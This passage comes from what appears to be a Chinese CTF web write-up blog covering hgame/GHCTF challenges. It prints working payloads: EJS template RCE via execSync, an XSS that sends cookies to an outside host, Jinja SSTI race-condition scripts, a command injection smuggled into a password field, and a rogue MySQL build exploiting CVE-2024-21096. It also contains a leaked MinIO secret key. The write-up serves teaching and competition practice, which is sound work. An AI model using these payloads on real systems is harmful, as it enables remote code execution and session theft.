class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003econtains_dangerous_keywords\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile_path\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e2\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003edangerous_keywords\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;_\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;os\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;subclasses\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;__builtins__\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;__globals__\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;flag\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e4\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile_path\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;rb\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e5\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003efile_content\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e7\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ekeyword\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003edangerous_keywords\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e8\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003ekeyword\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003efile_content\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e9\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# 找到危险关键字，返回 True\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e简单绕一下\u003c/p\u003e","title":"GHCTF-2025-Web-Writeup"},{"content":"Web week1 Level 24 Pacman 拿到环境\n一个小游戏，猜测应该是js审计\n查看index.js发现代码进行了混淆\n可以用工具反混淆一下，增加一下可读性\nhttps://tool.yuanrenxue.cn/decode_obfuscator\n反混淆之后找到这个\n感觉是栅栏，解密拿到flag\nLevel 47 BandBomb 文件上传\n附件有源码\n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;无效的文件名\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;文件处理错误\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;没有选择文件\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;文件上传成功\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`服务器运行在 http://localhost:${port}`); 89}); 这题有点像24国赛的ezjs\n文章 - 对ejs引擎漏洞及函数特性的利用 - 先知社区\n可以看到在 /rename 路由\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); 这个路由会将uploads目录中的文件重命名\n我们可以利用这个路由，通过目录穿越对任意文件进行移动和重命名\n也就是说我们可以通过上传恶意的ejs到uploads目录，接着通过/rename路由将我们上传的恶意ejs文件覆写掉/路由的模板文件mortis.ejs实现RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; 将ejs上传\n覆写原来的ejs\n访问/\n这题flag藏在环境变量里\npayload:\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard 密码爆破，XSS cookie窃取\n爆出来 shallot/888888\n登进去看到一个留言板\n猜测是xss，测试一下\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; 同时通过dirsearch扫到了/admin路由\n根据这句话大概可以猜到，访问/admin路由的时候应该会在后端以admin的身份来访问留言板\n也就是说我们可以进行cookie窃取\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; 将payload输出在留言板，然后访问/admin\n成功拿到admin的cookie\n拿admin的cookie访问/flag即可拿到flag\nLevel 25 双面人派对 这道题有两个环境，一开始以为是re，其实感觉更像是misc\n访问app.service-web可以拿到一个main文件\n是一个elf文件\n用exeinfo PE查到用upx加壳了\n用upx官方工具就可以脱壳\nhttps://github.com/upx/upx/releases/latest\n脱壳之后用ida打开\n可以找到一段关于minio的密钥信息\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; 那我们大概就能猜到另一个环境应该就是这个minio的服务\n用mc通过Access Key和Secret Key连接上去\n里面有两个储存桶\n将两个储存桶都下载下来\n/hints里面放的是8080服务的源码，/prodbucket里面是源码编译后的文件叫做update，猜测是热更新\n看一下源码\n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} 我们可以猜测/路由展示的这个.目录就是前面我们下周main文件的目录\n我们可以把.改成根目录/，然后将编译后的源码覆写掉原来的update，热更新后，我们就能直接访问根目录了\npayload:\npackage main\rimport (\r\u0026#34;level25/fetch\u0026#34;\r\u0026#34;level25/conf\u0026#34;\r\u0026#34;github.com/gin-gonic/gin\u0026#34;\r\u0026#34;github.com/jpillora/overseer\u0026#34;\r)\rfunc main() {\rfetcher := \u0026amp;fetch.MinioFetcher{\rBucket: conf.MinioBucket,\rKey: conf.MinioKey,\rEndpoint: conf.MinioEndpoint,\rAccessKey: conf.MinioAccessKey,\rSecretKey: conf.MinioSecretKey,\r}\roverseer.Run(overseer.Config{\rProgram: program,\rFetcher: fetcher,\r})\r}\rfunc program(state overseer.State) {\rg := gin.Default()\rg.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true))\rg.Run(\u0026#34;:8080\u0026#34;)\r} 这里我将/路由改成了/abc，因为不知道为啥我用/路由不行\n将源码编译后覆写到储存桶上\n访问/abc\n拿到flag\nLevel 38475 角落 ssti/条件竞争\n/robots.txt有个/app.conf\n访问/app.conf\n这里展示了httpd.conf的片段\n这里给出了源码的位置还有一个重写引擎的规则，猜测应该是该版本的apache存在源码泄露\n同时在响应标头能找到Apache的版本信息\n可以找到这个版本的apache存在源码泄露，而且是跟重写规则有关\nCVE-2024-38475\n网上没找到什么poc\n但是可以找到漏洞发现者的一篇文章\nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\n根据这篇文章我们可以构造出paylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F 这道题多了一个RewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;，只需要在user-agent前面加上L1nk/即可\n拿到源码\n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) 可以看到/read路由存在ssti，但是他waf掉了最重要的{\n但是可以看到这个/send路由会将传入的信息写入message.txt文件，在访问/read路由的时候则会读取message.txt文件。这么一来我们就可以考虑通过竞争的方式来绕过waf了。竞争思路大概就是我在很短的时间内连续发送两条信息，第一条信息是合法信息，而第二条信息是不合法的，那么就会存在一种情况，当第一条信息通过了判断，接下来要将文件的内容插入到模板中渲染的时候，刚好第二条不合法的信息覆写了message.txt，那么插入模板中的就是第二条不合法的信息了\n接下来就是搓脚本发包\n三个脚本\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break 成功执行，拿到flag\nweek2 week2强度有点高，就打了一道HoneyPot，复现一手\nLevel 21096 HoneyPot 应该是非预期\n可以找到这个函数，也就是/api/import，可以进行命令拼接\n1func ImportData(c *gin.Context) { 2 var config ImportConfig 3 if err := c.ShouldBindJSON(\u0026amp;config); err != nil { 4 c.JSON(http.StatusBadRequest, gin.H{ 5 \u0026#34;success\u0026#34;: false, 6 \u0026#34;message\u0026#34;: \u0026#34;Invalid request body: \u0026#34; + err.Error(), 7 }) 8 return 9 } 10 if err := validateImportConfig(config); err != nil { 11 c.JSON(http.StatusBadRequest, gin.H{ 12 \u0026#34;success\u0026#34;: false, 13 \u0026#34;message\u0026#34;: \u0026#34;Invalid input: \u0026#34; + err.Error(), 14 }) 15 return 16 } 17 18 config.RemoteHost = sanitizeInput(config.RemoteHost) 19 config.RemoteUsername = sanitizeInput(config.RemoteUsername) 20 config.RemoteDatabase = sanitizeInput(config.RemoteDatabase) 21 config.LocalDatabase = sanitizeInput(config.LocalDatabase) 22 if manager.db == nil { 23 dsn := buildDSN(localConfig) 24 db, err := sql.Open(\u0026#34;mysql\u0026#34;, dsn) 25 if err != nil { 26 c.JSON(http.StatusInternalServerError, gin.H{ 27 \u0026#34;success\u0026#34;: false, 28 \u0026#34;message\u0026#34;: \u0026#34;Failed to connect to local database: \u0026#34; + err.Error(), 29 }) 30 return 31 } 32 33 if err := db.Ping(); err != nil { 34 db.Close() 35 c.JSON(http.StatusInternalServerError, gin.H{ 36 \u0026#34;success\u0026#34;: false, 37 \u0026#34;message\u0026#34;: \u0026#34;Failed to ping local database: \u0026#34; + err.Error(), 38 }) 39 return 40 } 41 42 manager.db = db 43 } 44 if err := createdb(config.LocalDatabase); err != nil { 45 c.JSON(http.StatusInternalServerError, gin.H{ 46 \u0026#34;success\u0026#34;: false, 47 \u0026#34;message\u0026#34;: \u0026#34;Failed to create local database: \u0026#34; + err.Error(), 48 }) 49 return 50 } 51 //Never able to inject shell commands,Hackers can\u0026#39;t use this,HaHa 52 command := fmt.Sprintf(\u0026#34;/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s\u0026#34;, 53 config.RemoteHost, 54 config.RemoteUsername, 55 config.RemotePassword, 56 config.RemoteDatabase, 57 localConfig.Username, 58 localConfig.Password, 59 config.LocalDatabase, 60 ) 61 fmt.Println(command) 62 cmd := exec.Command(\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, command) 63 if err := cmd.Run(); err != nil { 64 c.JSON(http.StatusInternalServerError, gin.H{ 65 \u0026#34;success\u0026#34;: false, 66 \u0026#34;message\u0026#34;: \u0026#34;Failed to import data: \u0026#34; + err.Error(), 67 }) 68 return 69 } 70 71 c.JSON(http.StatusOK, gin.H{ 72 \u0026#34;success\u0026#34;: true, 73 \u0026#34;message\u0026#34;: \u0026#34;Data imported successfully\u0026#34;, 74 }) 75} Payload\n1{\u0026#34;remote_host\u0026#34;:\u0026#34;127.0.0.1\u0026#34;,\u0026#34;remote_port\u0026#34;:\u0026#34;3306\u0026#34;,\u0026#34;remote_username\u0026#34;:\u0026#34;root\u0026#34;,\u0026#34;remote_password\u0026#34;:\u0026#34;123456;/writeflag;#\u0026#34;,\u0026#34;remote_database\u0026#34;:\u0026#34;123\u0026#34;,\u0026#34;local_database\u0026#34;:\u0026#34;123\u0026#34;} 访问/flag拿到flag\nLevel 21096 HoneyPot_Revenge [CVE-2024-21096 mysqldump命令注入漏洞简析 | Ec3o](https://tech.ec3o.fun/2024/10/25/Web-Vulnerability Reproduction/CVE-2024-21096/)\n出题人的博客有写过这个知识点\n编译恶意Mysql 安装编译依赖\nsudo apt-get update\rsudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config\rwget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz\rtar -zxvf mysql-boost-8.0.34.tar.gz\rcd mysql-8.0.34 修改模板文件/include/mysql_version.h.in\nvim include/mysql_version.h.in /* Copyright Abandoned 1996,1999 TCX DataKonsult AB \u0026amp; Monty Program KB\r\u0026amp; Detron HB, 1996, 1999-2004, 2007 MySQL AB.\rThis file is public domain and comes with NO WARRANTY of any kind\r*/\r/* Version numbers for protocol \u0026amp; mysqld */\r#ifndef _mysql_version_h\r#define _mysql_version_h\r#define PROTOCOL_VERSION @PROTOCOL_VERSION@\r#define MYSQL_SERVER_VERSION \u0026#34;8.0.0-injection-test\\n\\\\! /writeflag\u0026#34;\r#define MYSQL_BASE_VERSION \u0026#34;mysqld-8.0.34\u0026#34;\r#define MYSQL_SERVER_SUFFIX_DEF \u0026#34;@MYSQL_SERVER_SUFFIX@\u0026#34;\r#define MYSQL_VERSION_ID @MYSQL_VERSION_ID@\r#define MYSQL_PORT @MYSQL_TCP_PORT@\r#define MYSQL_ADMIN_PORT @MYSQL_ADMIN_TCP_PORT@\r#define MYSQL_PORT_DEFAULT @MYSQL_TCP_PORT_DEFAULT@\r#define MYSQL_UNIX_ADDR \u0026#34;@MYSQL_UNIX_ADDR@\u0026#34;\r#define MYSQL_CONFIG_NAME \u0026#34;my\u0026#34;\r#define MYSQL_PERSIST_CONFIG_NAME \u0026#34;mysqld-auto\u0026#34;\r#define MYSQL_COMPILATION_COMMENT \u0026#34;@COMPILATION_COMMENT@\u0026#34;\r#define MYSQL_COMPILATION_COMMENT_SERVER \u0026#34;@COMPILATION_COMMENT_SERVER@\u0026#34;\r#define LIBMYSQL_VERSION \u0026#34;8.0.34-custom\u0026#34;\r#define LIBMYSQL_VERSION_ID @MYSQL_VERSION_ID@\r#ifndef LICENSE\r#define LICENSE GPL\r#endif /* LICENSE */\r#endif /* _mysql_version_h */ 执行命令的位置为\n#define MYSQL_SERVER_VERSION \u0026#34;8.0.0-injection-test\\n\\\\! /writeflag\u0026#34; 修改成要执行的命令之后，开始编译\nmkdir build\rcd build\rcmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost\rmake -j$(nproc) 我的服务器太烂了，编译了五个小时还编译失败了\n所以后面在本地用wsl编译完后再上传到服务器上\n本地编译的时候最好使用与服务器相同的路径\n不然install的时候会报错，很麻烦\n加下来在服务器上安装编译好的mysql\n安装\nsudo make install 创建⽤⼾组\nsudo groupadd mysql\rsudo useradd -r -g mysql -s /bin/false mysql 初始化\nsudo /usr/local/mysql/bin/mysqld --initialize --user=mysql --\rbasedir=/usr/local/mysql --datadir=/usr/local/mysql/data 初始化信息\nbasedir=/usr/local/mysql --datadir=/usr/local/mysql/data\r2025-02-20T16:35:47.430647Z 0 [System] [MY-013169] [Server] /usr/local/mysql/bin/mysqld (mysqld 8.0.0-injection-test \\! /writeflag) initializing of server in progress as process 557354\r2025-02-20T16:35:47.483565Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.\r2025-02-20T16:35:48.220016Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.\r2025-02-20T16:35:51.634311Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: #fq;t8\u0026lt;;j5AH\r-bash: --datadir=/usr/local/mysql/data: No such file or directory 设置⽬录权限\nsudo chown -R mysql:mysql /usr/local/mysql\rsudo chown -R mysql:mysql /usr/local/mysql/data 启动服务\nsudo /usr/local/mysql/bin/mysqld_safe --user=mysql \u0026amp; 登录\n/usr/local/mysql/bin/mysql -u root -p 修改密码\nALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;password\u0026#39;; 由于需要进行远程连接，需要配置root登录支持\nCREATE USER \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;password\u0026#39;; //创建用户\rGRANT ALL PRIVILEGES ON *.* TO \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39;; //授予权限\rFLUSH PRIVILEGES; 创建数据库\nCREATE DATABASE test;\rEXIT; 接下来就可以去导入数据了\n访问/flag,拿到flag\nLevel 60 SignInJava 这个是真不懂😥，等后面再回头看\nLevel 111 不存在的车厢 这是一道关于整数溢出打协议⾛私的题目\n题目给出的web服务⾃定义了⼀个H111协议，我们可以发现这个自定义协议中的所有Length字段均为uint16类型(0~65535)，而且没有做任何的长度限制，也就是说存在整数溢出\n而且这个协议是支持连接复用的，也就是同一TCP连接可处理多个请求。第一个请求发生溢出后，残留数据与后续请求混合后，服务端会错误解析到我们第二个请求，从⽽⾛私进第⼆个请求。\n官方wp是这么说的：\n开始复现\n先编写⼀段测试，放在protocol/request_test.go，通过go test -v -run TestGenRequest拿到输出\n1package protocol 2 3import ( 4\t\u0026#34;bytes\u0026#34; 5\t\u0026#34;encoding/hex\u0026#34; 6\t\u0026#34;net/http\u0026#34; 7\t\u0026#34;testing\u0026#34; 8) 9 10 11func TestGenRequest(t *testing.T) { 12\tvar buf bytes.Buffer 13\terr := 